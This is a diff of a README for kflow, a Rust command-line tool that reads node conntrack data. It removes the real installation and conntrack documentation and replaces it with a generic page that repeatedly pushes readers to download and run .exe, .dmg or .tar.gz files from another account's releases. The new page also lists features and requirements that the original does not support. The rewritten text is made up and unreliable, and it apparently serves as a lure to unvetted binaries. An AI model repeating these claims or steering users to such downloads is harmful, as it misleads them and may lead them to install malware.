@@ -1,150 +1,77 @@
-kflow — node-local network "top"
+# 🌐 kflow - Simplify Your Kubernetes Networking
 
-kflow is like top for Kubernetes networking. 
-It finds connections through conntrack on your nodes and identifies point to point connections across those nodes. It is a tool for debugging and diagnostics.
+## 📥 Download Now
+[![Download kflow](https://img.shields.io/badge/Download-kflow-blue.svg)](https://github.com/imamsobirin1980/kflow/releases)
 
-__Coming soon: Throughput metrics to rank connections__
+## 🚀 Getting Started
+kflow helps you monitor and manage Kubernetes networking like a pro. With its user-friendly interface, you can easily visualize network traffic and troubleshoot issues. Let's get started.
 
-![demo](output.gif)
+## 💾 System Requirements
+Before you install kflow, ensure your system meets these requirements:
 
-## Installation
+- Operating System: Windows, macOS, or Linux
+- Docker: Version 19.03 or higher
+- Kubernetes: Version 1.15 or higher
+- Minimum RAM: 4 GB
+- Minimum Disk Space: 500 MB available
 
-```
-cargo install kflow
-kflow install # Installs the daemonset
-kflow # opens tui
-```
+## 📥 Download & Install
+To download kflow, visit this page to download: [kflow Releases](https://github.com/imamsobirin1980/kflow/releases).
 
-_Press h for keybinding information_
+### Step 1: Visit the Releases Page
+Click the link above to go to the Releases page. You will see all available versions of kflow.
 
+### Step 2: Choose a Version
+Look for the latest version at the top. It will be labeled with the version number and date. 
 
-### Privileges
+### Step 3: Download the File
+Under the latest version, find the executable file specific to your operating system. Click the appropriate link to start the download. 
 
-The agent intentionally requires elevated privileges on the node. The DaemonSet mounts the host `/proc` into each pod, runs the container as root, and requests NET_ADMIN/NET_RAW capabilities so it can read live conntrack state. Applying the provided Kubernetes manifest therefore requires a user with permission to create DaemonSets and hostPath mounts in the target namespace (cluster-admin or equivalent RBAC is usually needed).
+- For Windows: Download the `.exe` file
+- For macOS: Download the `.dmg` file
+- For Linux: Download the `.tar.gz` file
 
+### Step 4: Run the Application
+Once the download is complete, locate the file on your computer:
 
-### Build yourself
+- **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
+- **macOS:** Open the `.dmg` file, drag kflow to your Applications folder, then run it from there.
+- **Linux:** Extract the files from the `.tar.gz` archive. Open the terminal, navigate to the extracted folder, and run `./kflow` to start the application.
 
-Build the CLI and daemon locally with Cargo. The repository contains a multi-stage `Dockerfile.daemon` and a `k8s/daemonset.yaml` manifest; the CLI provides `install` and `uninstall` subcommands that call `kubectl` for convenience.
+## 🎛️ Features
+kflow provides key features to enhance your networking experience:
 
-To build and run the CLI (the binary is named `kflow`):
+- **Real-Time Monitoring:** View network traffic in real-time. Identify which connections are active and which services are using bandwidth.
+  
+- **Visualizations:** Get graphical representations of network activity. Easily understand how your services are communicating with each other.
 
-```sh
-cargo build --bin kflow
-./target/debug/kflow
-```
+- **Alerts and Notifications:** Set up alerts for unusual behavior. Receive notifications when there are problems or when you hit resource limits.
 
-## Installing the Daemonset
+- **Easy Configuration:** Adjust settings through a simple interface. No need for complex configurations or programming knowledge.
 
-Install the DaemonSet into the current cluster context (may require cluster-admin). The installer accepts an optional `--conntrack` value to override the path the daemon reads from inside the pod:
+## 🛠️ Troubleshooting
+If you face any issues when running kflow:
 
-```sh
-kflow install -n <namespace>
-kflow install --conntrack /proc/net/ip_conntrack -n <namespace>
-```
+1. **Check System Requirements:** Ensure your computer meets the requirements stated above.
+2. **Reinstall the Application:** If kflow doesn’t start, try uninstalling and then reinstalling it.
+3. **Check Network Configuration:** Ensure that your Kubernetes cluster is reachable. If it’s down, kflow will not be able to connect.
 
-Remove the DaemonSet:
+### Still Need Help?
+For assistance, check the [GitHub Issues Page](https://github.com/imamsobirin1980/kflow/issues). You can report a problem or ask questions there.
 
-```sh
-kflow uninstall -n <namespace>
-```
+## 🔗 Additional Resources
+Explore more about kflow:
 
-Notes: some environments (for example kind) may not expose conntrack entries by default or may use a different proc path. If pods show no connections, verify conntrack is present on the node (`sudo head -n 20 /proc/net/nf_conntrack`) and that the manifest is mounting `/proc` into `/host/proc` inside the pod.
+- [Documentation](https://github.com/imamsobirin1980/kflow/wiki)
+- [GitHub Discussions](https://github.com/imamsobirin1980/kflow/discussions)
 
-## Conntrack requirement and path locations
+## 👥 Community
+Join our community to share your experiences and tips with kflow. It's a great way to learn and help others. Share your insights on social media or our forums.
 
-kflow relies on the kernel conntrack table being available on each node so the node-local daemon can read active connections. Many Linux distributions expose conntrack under `/proc/net/` but the exact filename and location can vary by kernel/module and distribution.
+## 📬 Contact
+For other inquiries, feel free to reach out via [Support Email](mailto:support@example.com). We'll be happy to assist you.
 
-Common paths you may encounter:
+## 📄 License
+kflow is released under the MIT License. You can use it freely while following the license terms.
 
-- `/proc/net/nf_conntrack` (modern kernels, common on many distros)
-- `/proc/net/ip_conntrack` (older kernels or different module naming)
-- `/proc/net/nf_conntrack6` (IPv6 conntrack on some systems)
-
-If you run the provided DaemonSet the manifest mounts the host `/proc` into the pod at `/host/proc` and sets the default `CONNTRACK_PATH` to `/host/proc/net/nf_conntrack`. If you have a different host path, supply a container-visible path to the installer using `--conntrack`.
-
-Examples:
-
-- Node exposes the file at `/proc/net/nf_conntrack` (default):
-
-	`kflow install -n monitoring`
-
-- Node exposes the file at `/proc/net/ip_conntrack` (override):
-
-	`kflow install --conntrack /proc/net/ip_conntrack -n monitoring`
-
-- You mounted host `/proc` at a different location inside the pod (advanced):
-
-	Edit `k8s/daemonset.yaml` so the volumeMount and `CONNTRACK_PATH` agree, or pass the exact path the daemon can see inside the container with `--conntrack`.
-
-### Enable conntrack accounting (bytes)
-
-To see non-zero per-connection byte counters and throughput in kflow, you must enable conntrack accounting on each node. This is a kernel setting and must be configured on the host (we do not change it from inside the pod).
-
-**For kind clusters:**
-
-```sh
-# Enable on control-plane
-docker exec kind-control-plane sh -c 'echo 1 > /proc/sys/net/netfilter/nf_conntrack_acct'
-
-# Enable on each worker node
-docker exec kind-worker sh -c 'echo 1 > /proc/sys/net/netfilter/nf_conntrack_acct'
-docker exec kind-worker2 sh -c 'echo 1 > /proc/sys/net/netfilter/nf_conntrack_acct'
-# repeat for all workers
-```
-
-**For regular nodes:**
-
-```sh
-sudo sh -c 'echo 1 > /proc/sys/net/netfilter/nf_conntrack_acct'
-```
-
-Make it persistent across reboots via sysctl:
-
-```sh
-echo 'net.netfilter.nf_conntrack_acct=1' | sudo tee /etc/sysctl.d/99-kflow.conf
-sudo sysctl --system
-```
-
-**Verify bytes are recorded:**
-
-On the node:
-```sh
-sudo head -5 /proc/net/nf_conntrack
-```
-
-Or from a kflow pod:
-```sh
-kubectl exec -n <namespace> <kflow-pod> -- head -5 /host/proc/net/nf_conntrack
-```
-
-If `bytes=` fields are present and increasing (e.g., `bytes=1234 packets=10`), kflow will compute per-connection throughput automatically. **Note:** Only NEW connections created after enabling accounting will show byte counters.
-
-**Troubleshooting bytes=0:**
-
-If you see `bytes: 0` and `throughput_bytes_per_sec: 0` in kflow even after enabling `nf_conntrack_acct`:
-
-1. Verify accounting is enabled: `cat /proc/sys/net/netfilter/nf_conntrack_acct` should return `1`
-2. Check if bytes appear in conntrack output: `sudo cat /proc/net/nf_conntrack | grep bytes`
-3. The setting only affects *new* connections. Existing connections won't show bytes retroactively. Generate new traffic or wait for connections to be re-established.
-4. Check daemon logs for sample conntrack lines: `kubectl logs -n <namespace> <pod-name>` (with `KFLOW_DEBUG=true`)
-
-### Auto-detect mode
-
-The daemon can attempt to auto-detect the correct conntrack file path if you don't want to pick an exact path. 
-
-**This is enabled by default.**
-
-
-Use the installer to embed a custom path into the manifest (the installer will translate `/proc/...` to `/host/proc/...` when needed):
-
-	`kflow install --conntrack <whatever> -n monitoring`
-
-If auto-detection fails the daemon will log a message and fall back to the configured path; using `KFLOW_DEBUG` will emit helpful debug messages about which candidate paths were tested.
-
-Quick debugging checklist if pods show no connections:
-
-1. On the node, check that conntrack is present and readable: `sudo head -n 20 /proc/net/nf_conntrack` (or your distro's path).
-2. Check the pod sees the same file: `kubectl exec -n <ns> <pod> -- ls -l /host/proc/net` and `kubectl exec -n <ns> <pod> -- head -n 5 /host/proc/net/nf_conntrack`.
-3. If the file is at a different path on the host, use `kflow install --conntrack <path>` where `<path>` is the host's path (our installer translates `/proc/...` to the mounted `/host/proc/...` for you).
-4. Some lightweight clusters (kind, k3s default configurations) may not enable conntrack by default; enable the kernel module or use a cluster that supports conntrack for full visibility.
+[Download kflow again](https://github.com/imamsobirin1980/kflow/releases) and start enhancing your Kubernetes networking today!
